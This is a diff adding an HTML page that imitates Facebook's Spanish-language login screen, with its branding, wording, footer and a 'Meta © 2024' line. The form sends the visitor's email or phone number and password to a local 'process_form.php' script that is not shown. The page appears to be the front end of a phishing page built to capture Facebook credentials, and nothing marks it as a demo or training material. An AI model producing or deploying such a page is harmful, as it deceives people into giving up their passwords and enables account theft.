@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .left-panel {
+            margin-right: 50px;
+        }
+
+        .left-panel h1 {
+            color: #1877f2;
+            font-size: 3em;
+            margin: 0;
+        }
+
+        .left-panel p {
+            font-size: 1.5em;
+            color: #606770;
+        }
+
+        .right-panel {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .right-panel input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .right-panel button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+
+        .right-panel .create-account {
+            background-color: #42b72a;
+        }
+
+        .right-panel a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            background-color: #f0f2f5;
+            padding: 20px 0;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 10px 0;
+        }
+
+        .footer-links a {
+            margin: 0 10px;
+            color: #606770;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-panel">
+            <h1>facebook</h1>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        <div class="right-panel">
+            <form action="process_form.php" method="post">
+                <input type="text" name="email_or_phone" placeholder="Correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+                <a href="#">¿Olvidaste tu contraseña?</a>
+                <button type="button" class="create-account">Crear cuenta nueva</button>
+            </form>
+            <p>Crea una página para una celebridad, una marca o un negocio.</p>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Español</a>
+            <a href="#">English (US)</a>
+            <a href="#">Italiano</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">Français (France)</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Registrarte</a>
+            <a href="#">Iniciar sesión</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+        </div>
+        <p>Meta © 2024</p>
+    </footer>
+</body>
+</html>
